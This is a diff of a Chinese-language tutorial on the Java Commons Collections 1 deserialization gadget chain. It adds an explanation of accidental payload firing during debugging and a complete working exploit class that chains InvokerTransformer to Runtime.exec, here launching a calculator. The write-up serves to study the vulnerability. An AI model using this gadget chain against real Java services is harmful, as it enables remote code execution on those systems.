@@ -371,7 +371,96 @@ public class CommonsCollections1 {
 
 ## 坑点
 
-在前面调试的时候，在未进入`readObject()`反序列化方法时，就弹出了计算器，原因是由于`IDEA`中`Debug`就利用`toString`，在过程中会调用代理类的`toString`方法从而造成非预期的命令执行。
+在前面调试的时候，在未进入`readObject()`反序列化方法时，就弹出了计算器，原因是在第一次代理了`map`对象后，在执行`map`类的任意方法都会触发构造的`payload`，而由于`IDEA`中`Debug`的过程中会调用到代理类的`toString`方法从而造成非预期的命令执行。
 
 解决方案是取消掉这两处的✅
 ![image-20220926151832327](images/image-20220926151832327.png)
+
+当前也可以参照`ysoserial`的处理
+![image-20221005001535438](images/image-20221005001535438.png)
+
+先在开头设置一个没有危害的对象，在最后进行序列化的时候再把真正具有危害的`transformers`数组替换，从而避免了非预期的 rce
+```java
+package com.serialize;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+
+/**
+ * Created by dotast on 2022/9/19 22:00
+ */
+public class CommonsCollections1 {
+    public static void main(String[] args) throws Exception {
+        CommonsCollections1 transformerTest = new CommonsCollections1();
+        transformerTest.serialize();
+        transformerTest.unserialize();
+    }
+
+    /*
+     * 客户端
+     * */
+    public void  serialize() throws Exception{
+        String cmd = "open -a Calculator.app";
+
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                // new Class[0]为占位符
+                new InvokerTransformer(
+                        "getMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime",new Class[0]}
+                ),
+                new InvokerTransformer(
+                        "invoke",new Class[]{Object.class, Object[].class},new Object[]{null, new Object[0]}
+                ),
+                new InvokerTransformer(
+                        "exec", new Class[]{String.class}, new Object[]{cmd}
+                )
+        };
+        // 创建虚假的调用链
+        Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
+        ChainedTransformer ChainedTransformer = new ChainedTransformer(fakeTransformers);
+
+        Map innerMap = new HashMap<>();
+        Map outerMap = LazyMap.decorate(innerMap, ChainedTransformer);
+        // 获取AnnotationInvocationHandler类对象
+        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        // 获取AnnotationInvocationHandler类的构造方法
+        Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class);
+        // 设置方法访问权限
+        constructor.setAccessible(true);
+        InvocationHandler mapHandler = (InvocationHandler) constructor.newInstance(Override.class, outerMap);
+        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, mapHandler);
+        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, proxyMap);
+        // 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值
+        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
+        f.setAccessible(true);
+        f.set(ChainedTransformer, transformers);
+        FileOutputStream fileOutputStream = new FileOutputStream("1.txt");
+        // 创建并实例化对象输出流
+        ObjectOutputStream out = new ObjectOutputStream(fileOutputStream);
+        out.writeObject(handler);
+    }
+
+    /*
+     * 服务端
+     *  */
+    public void unserialize() throws Exception{
+        // 创建并实例化文件输入流
+        FileInputStream fileInputStream = new FileInputStream("1.txt");
+        // 创建并实例化对象输入流
+        ObjectInputStream in = new ObjectInputStream(fileInputStream);
+        in.readObject();
+    }
+}
+```
+
